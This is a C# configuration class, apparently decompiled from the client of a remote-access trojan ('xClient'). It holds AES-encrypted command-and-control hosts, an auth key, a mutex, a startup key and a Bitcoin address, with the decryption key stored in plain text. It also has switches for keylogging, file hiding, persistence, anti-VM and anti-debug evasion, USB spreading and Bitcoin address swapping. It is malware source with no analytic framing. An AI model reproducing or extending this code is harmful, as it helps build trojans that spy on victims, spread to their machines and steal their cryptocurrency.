using System;
using xClient.Core.Cryptography;
using xClient.Core.Helper;

namespace xClient.Config;

public static class Settings
{
	public static string VERSION = "w1DrIYc8Q0GQdZS0YQECD5LdWRlx3EULbHW66woOg26v/51+FTn+aRLniBfhRqxFALakSUMztN1cr1ROZTWQwQ==";

	public static string HOSTS = "jmjBPc0Q+pHgJDiQdI1v1xBmrtywEgRYYLj2ji8Ehsb9EkNINiSUttft+3wu/GplblVMqNCEfl93tnnv4BsFXQ==";

	public static int RECONNECTDELAY = 3000;

	public static string KEY = "IajZe+imAbV7y5kOoTBb3w==";

	public static string AUTHKEY = "WCTBoKlJetBgecQU6rHQMC6JVkypUG0a5DanOQb3X0xiseiMeRQKuyRt13c7zs8467KGM1imYWAEw26zL4+1IA==";

	public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;

	public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);

	public static string SUBDIRECTORY = "RPKyTAA4q9fHKU1/Ykrmp9JL7PVlq3a/6sNxx3Wu6M3BWeS8aKOB1DhVs3znCRGCf33P1sPVGj3IUW/x/4FwbQ==";

	public static string INSTALLNAME = "RauppNpvbNepOtBtksknXPaHKYB1JXojr9c+FR85zTQ/ilQCp3OHhvsz+xxesBSEswviPdY/8ubd0c5sJuoFmw==";

	public static bool INSTALL = false;

	public static bool STARTUP = false;

	public static string MUTEX = "zRpYgpxYkS3szbNKp/fy45ODAB8AUMzzY7aItbJav8CddMPBFkWaE8gEQ+FC8BzIrhMULePS1SVM4CMNdv9j0N3vnGfY6omBRV8SwsnF7/I=";

	public static string STARTUPKEY = "MkcIaiziH/sZQcm4gvlYdCvUEBh+bYXoNLdgnE83T9MqIKrHp1YadDm5orE8ntHfvkjelWrWHySODTnm3JOlgV66WUVK6LauZq5L0IY5SCY=";

	public static bool HIDEFILE = true;

	public static bool ENABLELOGGER = true;

	public static string ENCRYPTIONKEY = "GAEepyiDza2VzwlRhKDO";

	public static string TAG = "Pwlj8+V42oxBYqEhOfTGC3kldUOQAtZKZElu7u50dTEkQE3LMmDu4fwo4GrtRuRgqcviWX9XoI0ret+EooihvQ==";

	public static string LOGDIRECTORYNAME = "11MI6i66tf/ZffEEBVTopxDRdR64zXWx/aQ+esLZoSNKyita1Y1Nyd+Ej/P+TgHAwa5NQgZQLoDlsvqo6/AMtA==";

	public static string USBSpreadNAME = "AtulRWalu3I/5I53tpbxUGgduIFP7yCDk6b4oTpi4YJZQfmKoOawUGoBvwttI+h/apDu9ILBEq3JFzl4fZzaBA==";

	public static string BTCAddress = "qoudQMkM5ZnDWYBYY/rQdnGjy09i2xE+D10sK0jC4CYTcM+NgstiSjAg1FT3gV6pV759GMCEi4kd81e5Ug6ADg==";

	public static bool HIDELOGDIRECTORY = true;

	public static bool HIDEINSTALLSUBDIRECTORY = true;

	public static bool ENABLEPERSISTENCE = false;

	public static bool ENABLEANTISANDBOXIE = false;

	public static bool ENABLEANTIVM = false;

	public static bool ENABLEUSBSPREAD = false;

	public static bool ANTIDEBUG = false;

	public static bool STARTUPPERSISTENCE = false;

	public static bool ENABLEBTCSWAP = false;

	public static bool Initialize()
	{
		if (string.IsNullOrEmpty(VERSION))
		{
			return false;
		}
		AES.SetDefaultKey(ENCRYPTIONKEY);
		TAG = AES.Decrypt(TAG);
		VERSION = AES.Decrypt(VERSION);
		HOSTS = AES.Decrypt(HOSTS);
		SUBDIRECTORY = AES.Decrypt(SUBDIRECTORY);
		INSTALLNAME = AES.Decrypt(INSTALLNAME);
		MUTEX = AES.Decrypt(MUTEX);
		STARTUPKEY = AES.Decrypt(STARTUPKEY);
		LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME);
		USBSpreadNAME = AES.Decrypt(USBSpreadNAME);
		BTCAddress = AES.Decrypt(BTCAddress);
		FixDirectory();
		return true;
	}

	private static void FixDirectory()
	{
		if (!PlatformHelper.Is64Bit)
		{
			switch (SPECIALFOLDER)
			{
			case Environment.SpecialFolder.ProgramFilesX86:
				SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
				break;
			case Environment.SpecialFolder.SystemX86:
				SPECIALFOLDER = Environment.SpecialFolder.System;
				break;
			}
			DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
		}
	}
}
